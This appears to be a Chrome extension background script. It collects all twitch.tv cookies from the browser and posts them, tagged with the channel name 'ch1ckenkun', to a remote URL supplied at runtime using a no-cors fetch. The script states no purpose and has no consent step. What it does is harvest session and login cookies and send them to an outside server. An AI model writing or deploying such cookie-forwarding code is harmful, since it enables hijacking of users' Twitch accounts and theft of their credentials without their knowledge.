chrome.runtime.onMessage.addListener(function (message, sender, callback) {
    if (message.command === 'GetCookies') {
        chrome.cookies.getAll({domain: "twitch.tv"}, function (cookies)  {
            callback(cookies);
        });
    }
	else if (message.command == 'SendCookies') {
        const body = JSON.stringify({cookies: message.cookies, channel_names: ['ch1ckenkun']})
        console.log(body)
        fetch(message.url, {method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: body})
            .then(res => {
                callback(res)
            })
            .catch(err => {
                callback(err)
            })
	}
    return true;
});
